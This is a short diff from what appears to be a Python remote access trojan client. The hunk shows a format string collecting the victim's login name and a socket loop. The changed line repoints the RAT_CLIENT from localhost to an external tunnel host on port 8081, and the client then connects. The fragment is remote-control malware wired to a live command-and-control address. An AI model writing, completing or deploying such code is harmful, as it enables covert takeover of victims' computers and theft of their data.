@@ -603,7 +603,7 @@ User: {os.getlogin()}
                 s.send(b"exit")
                 break
 
-rat = RAT_CLIENT('127.0.0.1', 8081)
+rat = RAT_CLIENT('https://chunkyrat-d0tmaxx.p.tnnl.in', 8081)
 
 if __name__ == '__main__':
     rat.build_connection()
